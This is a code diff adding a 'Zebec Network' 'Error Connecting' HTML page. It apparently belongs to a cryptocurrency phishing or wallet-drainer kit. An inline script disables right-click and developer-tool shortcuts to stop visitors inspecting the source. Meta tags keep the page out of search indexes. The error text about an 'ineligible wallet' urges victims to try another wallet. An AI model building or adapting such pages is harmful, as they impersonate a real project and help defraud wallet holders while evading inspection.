@@ -1,0 +1,203 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="noindex, nofollow">
+    <meta http-equiv="Cache-Control" content="no-store">
+    <script>(function () { document.addEventListener('contextmenu', function (e) { e.preventDefault(); return false; }); document.addEventListener('keydown', function (e) { if (e.key === 'F12' || (e.ctrlKey && e.shiftKey && (e.key === 'I' || e.key === 'J' || e.key === 'C')) || (e.ctrlKey && e.key === 'U')) { e.preventDefault(); return false; } }); })();</script>
+    <link href="https://cdn.jsdelivr.net/npm/remixicon@4.5.0/fonts/remixicon.css" rel="stylesheet" />
+    <link rel="preconnect" href="https://fonts.googleapis.com">
+    <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+    <link
+        href="https://fonts.googleapis.com/css2?family=Space+Grotesk:wght@300;400;500;600;700&family=Outfit:wght@300;400;500;600;700&family=DM+Sans:wght@300;400;500;600;700&display=swap"
+        rel="stylesheet">
+    <link rel="stylesheet" href="style.css">
+    <title>Zebec Network - Error Connecting</title>
+    <style>
+        .error-page {
+            min-height: 100vh;
+            background: #f8f9fc;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            padding: 40px 16px 60px;
+        }
+
+        .error-card {
+            width: 100%;
+            max-width: 480px;
+            background: #ffffff;
+            border-radius: 20px;
+            border: 1px solid rgba(220, 40, 41, 0.2);
+            box-shadow:
+                0 12px 40px rgba(220, 40, 41, 0.08),
+                0 4px 16px rgba(0, 0, 0, 0.04);
+            padding: 48px 36px 40px;
+            text-align: center;
+            position: relative;
+            overflow: hidden;
+        }
+
+        .error-card::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            right: 0;
+            height: 4px;
+            background: linear-gradient(90deg, #dc2829, #f87171);
+            border-radius: 20px 20px 0 0;
+        }
+
+        .error-icon-box {
+            width: 72px;
+            height: 72px;
+            margin: 0 auto 24px;
+            background: rgba(220, 40, 41, 0.08);
+            border-radius: 50%;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            border: 1px solid rgba(220, 40, 41, 0.15);
+        }
+
+        .error-icon-box i {
+            font-size: 36px;
+            color: #dc2829;
+            animation: pulse-error 2s infinite ease-in-out;
+        }
+
+        @keyframes pulse-error {
+
+            0%,
+            100% {
+                transform: scale(1);
+                opacity: 1;
+            }
+
+            50% {
+                transform: scale(1.1);
+                opacity: 0.8;
+            }
+        }
+
+        .error-title {
+            font-family: 'Orbitron', monospace;
+            font-size: 24px;
+            font-weight: 700;
+            color: #11002c;
+            margin-bottom: 12px;
+            letter-spacing: -0.02em;
+        }
+
+        .error-desc {
+            font-size: 15px;
+            line-height: 1.7;
+            color: #555570;
+            margin-bottom: 32px;
+        }
+
+        .error-desc strong {
+            color: #dc2829;
+            font-weight: 600;
+        }
+
+        .action-buttons {
+            display: flex;
+            flex-direction: column;
+            gap: 12px;
+        }
+
+        .btn-try-again {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 14px 24px;
+            background: #11002c;
+            color: #ffffff;
+            border: none;
+            border-radius: 12px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.2s;
+        }
+
+        .btn-try-again:hover {
+            background: #1e0050;
+            transform: translateY(-2px);
+            box-shadow: 0 8px 24px rgba(17, 0, 44, 0.25);
+        }
+
+        .btn-home {
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            width: 100%;
+            padding: 14px 24px;
+            background: #ffffff;
+            color: #11002c;
+            border: 1px solid rgba(17, 0, 44, 0.15);
+            border-radius: 12px;
+            font-family: 'DM Sans', sans-serif;
+            font-size: 15px;
+            font-weight: 700;
+            cursor: pointer;
+            text-decoration: none;
+            transition: all 0.2s;
+        }
+
+        .btn-home:hover {
+            background: #f8f9fc;
+            border-color: rgba(17, 0, 44, 0.3);
+            transform: translateY(-2px);
+        }
+
+        @media (max-width: 480px) {
+            .error-card {
+                padding: 40px 24px 32px;
+            }
+
+            .error-title {
+                font-size: 20px;
+            }
+
+            .error-desc {
+                font-size: 14px;
+            }
+        }
+    </style>
+</head>
+
+<body>
+    <div class="error-page">
+        <div class="error-card">
+            <div class="error-icon-box">
+                <i class="ri-error-warning-fill"></i>
+            </div>
+
+            <h1 class="error-title">Error Connecting</h1>
+
+            <p class="error-desc">
+                We couldn't establish a secure connection. <br><br>
+                <strong>Insufficient volume / Ineligible wallet.</strong> <br>
+                Please refresh and try another wallet or ensure your current wallet has sufficient activity.
+            </p>
+
+            <div class="action-buttons">
+                <a href="index.html" class="btn-home">
+                    <i class="ri-home-4-line"></i> Return Home
+                </a>
+            </div>
+        </div>
+    </div>
+</body>
+
+</html>
